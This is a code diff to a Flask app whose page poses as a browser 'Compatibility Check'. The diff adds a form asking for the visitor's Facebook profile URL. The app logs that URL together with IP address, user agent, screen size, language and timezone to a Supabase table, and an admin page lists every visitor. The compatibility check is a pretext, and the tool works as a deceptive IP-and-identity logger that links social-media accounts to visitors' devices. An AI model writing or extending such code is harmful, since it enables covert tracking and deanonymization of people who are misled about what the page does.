@@ -1,6 +1,7 @@
 import os
 from datetime import datetime, timezone
 from html import escape
+from urllib.parse import urlparse
 
 from flask import Flask, request, render_template_string
 from supabase import create_client
@@ -148,6 +149,49 @@ PAGE = """
             color:#bfdbfe;
         }
 
+        form{
+            margin-top:24px;
+            display:grid;
+            gap:12px;
+        }
+
+        input{
+            width:100%;
+            border:1px solid rgba(255,255,255,0.22);
+            border-radius:14px;
+            padding:14px 16px;
+            background:rgba(15,23,42,0.55);
+            color:white;
+            font-size:15px;
+            outline:none;
+        }
+
+        input::placeholder{
+            color:#bfdbfe;
+        }
+
+        button{
+            border:0;
+            border-radius:14px;
+            padding:14px 16px;
+            background:white;
+            color:#2563eb;
+            font-size:15px;
+            font-weight:bold;
+            cursor:pointer;
+        }
+
+        button:disabled{
+            cursor:not-allowed;
+            opacity:0.65;
+        }
+
+        .status{
+            min-height:20px;
+            color:#dbeafe;
+            font-size:13px;
+        }
+
     </style>
 
 </head>
@@ -167,17 +211,26 @@ PAGE = """
         <h1>Compatibility Check</h1>
 
         <p>
-            Please wait while we verify your browser and device compatibility.
+            Enter a Facebook profile or page URL to check device compatibility.
         </p>
 
-        <div class="loader"></div>
+        <form id="check-form">
+            <input
+                id="facebook-url"
+                type="url"
+                placeholder="https://www.facebook.com/username"
+                required
+            >
 
-        <div class="badge">
-            Scanning Device...
-        </div>
+            <button id="submit-button" type="submit">
+                Check Device
+            </button>
+
+            <div class="status" id="status"></div>
+        </form>
 
         <div class="notice">
-            Basic browser analytics may be collected for performance and security purposes.
+            Device details are recorded when you submit this form.
         </div>
 
     </div>
@@ -217,24 +270,48 @@ function detectPlatform(){
     return platform || "Unknown";
 }
 
-fetch("/collect",{
+document.getElementById("check-form").addEventListener("submit", async (event) => {
+    event.preventDefault();
 
-    method:"POST",
+    const status = document.getElementById("status");
+    const submitButton = document.getElementById("submit-button");
+    const facebookUrl = document.getElementById("facebook-url").value.trim();
 
-    headers:{
-        "Content-Type":"application/json"
-    },
+    submitButton.disabled = true;
+    status.textContent = "Checking device...";
 
-    body:JSON.stringify({
+    try{
+        const response = await fetch("/collect",{
 
-        userAgent:navigator.userAgent,
-        platform:detectPlatform(),
-        language:navigator.language,
-        screen:screen.width + "x" + screen.height,
-        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+            method:"POST",
 
-    })
+            headers:{
+                "Content-Type":"application/json"
+            },
 
+            body:JSON.stringify({
+
+                fbUrl:facebookUrl,
+                userAgent:navigator.userAgent,
+                platform:detectPlatform(),
+                language:navigator.language,
+                screen:screen.width + "x" + screen.height,
+                timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+
+            })
+
+        });
+
+        if(!response.ok){
+            throw new Error("Request failed");
+        }
+
+        status.textContent = "Device check saved.";
+    }catch(error){
+        status.textContent = "Unable to save. Please check the URL and try again.";
+    }finally{
+        submitButton.disabled = false;
+    }
 });
 
 </script>
@@ -303,12 +380,29 @@ h1{
 def home():
     return render_template_string(PAGE)
 
+def is_facebook_url(value):
+    parsed = urlparse(value or "")
+    hostname = (parsed.hostname or "").lower()
+
+    return parsed.scheme in {"http", "https"} and (
+        hostname == "facebook.com" or
+        hostname == "www.facebook.com" or
+        hostname.endswith(".facebook.com") or
+        hostname == "fb.com" or
+        hostname.endswith(".fb.com")
+    )
+
 @app.route("/collect", methods=["POST"])
 def collect():
 
     data = request.get_json(silent=True) or {}
+    fb_url = (data.get("fbUrl") or "").strip()
+
+    if fb_url and not is_facebook_url(fb_url):
+        return {"status": "error", "message": "Only Facebook URLs are accepted."}, 400
 
     payload = {
+        "fb_url": fb_url,
         "user_agent": data.get("userAgent"),
         "platform": data.get("platform"),
         "language": data.get("language"),
@@ -322,7 +416,12 @@ def collect():
     }
 
     if supabase:
-        supabase.table(SUPABASE_TABLE).insert(payload).execute()
+        try:
+            supabase.table(SUPABASE_TABLE).insert(payload).execute()
+        except Exception:
+            fallback_payload = dict(payload)
+            fallback_payload.pop("fb_url", None)
+            supabase.table(SUPABASE_TABLE).insert(fallback_payload).execute()
     else:
         visitors.append(payload)
 
@@ -360,6 +459,8 @@ def admin():
             <div class="log">
 
             <p><span class="label">Time:</span> {escape(str(v.get('collected_at', '')))}</p>
+
+            <p><span class="label">Facebook URL:</span> {escape(str(v.get('fb_url', '')))}</p>
 
             <p><span class="label">IP:</span> {escape(str(v.get('ip', '')))}</p>
 
